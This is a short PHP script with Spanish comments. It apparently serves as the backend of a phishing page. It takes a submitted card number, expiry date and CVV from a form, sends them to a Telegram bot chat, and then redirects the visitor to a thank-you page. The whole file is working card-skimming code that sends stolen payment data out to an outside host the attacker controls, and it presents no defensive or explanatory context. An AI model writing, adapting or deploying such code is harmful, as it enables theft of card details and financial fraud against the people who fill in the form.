<?php
// Incluir el archivo de configuración
include 'config.php'; // Asegúrate de que la ruta de config.php sea correcta

// Verificar que las variables estén definidas
if (!isset($token) || !isset($chat_id)) {
    die("Error: El token o el ID de chat no están definidos.");
}

// Obtener los datos del formulario
$tarjeta = $_POST['tarj'];
$fecha = $_POST['fecha'];
$cvv = $_POST['pass']; // Aquí incluimos el campo CVV correctamente

// Formatear el mensaje con todos los datos
$mensaje = "📝 *Detalles de la Tarjeta Recibida* 📝\n\n";
$mensaje .= "💳 *Número de Tarjeta*: $tarjeta\n";
$mensaje .= "📅 *Fecha de Expiración*: $fecha\n";
$mensaje .= "🔒 *Código de Seguridad (CVV)*: $cvv\n"; // Incluimos el CVV en el mensaje

// Enviar los datos a Telegram
$telegram_url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

// Usar cURL para enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Verificar si el mensaje fue enviado con éxito
if ($response === false) {
    die("Error al enviar el mensaje a Telegram.");
} else {
    // Redirigir a otra página después de enviar los datos
    header("Location: gracias.html"); // Cambia esto por la página a la que quieres redirigir
    exit;
}
?>
